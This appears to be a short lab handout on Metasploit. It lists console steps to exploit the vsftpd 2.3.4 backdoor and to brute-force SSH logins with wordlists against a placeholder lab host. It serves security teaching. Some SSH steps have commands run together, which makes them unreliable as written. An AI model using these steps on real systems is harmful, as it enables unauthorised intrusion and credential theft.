TP4 - Gaining access > Metasploit

Matasploit is a framework that lots of cybercriminals use. As it is an open-source one, it can be easily customized to response your own need.

VSFTPD

The metasploit framework allows you to exploit some vulnerabilities. You can for example exploit the VSFTPD backdoor. Follow these steps in order to exploit that backdoor :

1- Search vsftpd
2- use exploit/unix/ftp/vsftpd_234_backdoor
3- show options
4- set RHOSTS IP_VISMIN
5- exploit

SSH

This tool also allows you to exploit SSH. Please follow the following steps.

1- Search ssh-login
2- use auxiliary/scanner/ssh/ssh_login
3- setg rhosts IP_VISMIN
4- set USER_FILE /home/kali/FTP_hack/usernames.txtset RHOSTS IP_VISMIN
5- set PASS_FILE /home/kali/FTP_hack/ passwords.txtexploit
6- Exploit

And much more

This framework enables you to exploit much more backdoors. We have seen how to perform NetBIOS-SSN, JAVA-RMI, PostgreSQL, TOMCAT attacks using this framework. This page serves as a guide to introduce you to the Metasploit framework. All the attacks I have quoted can be performed in the same way as the previous ones.
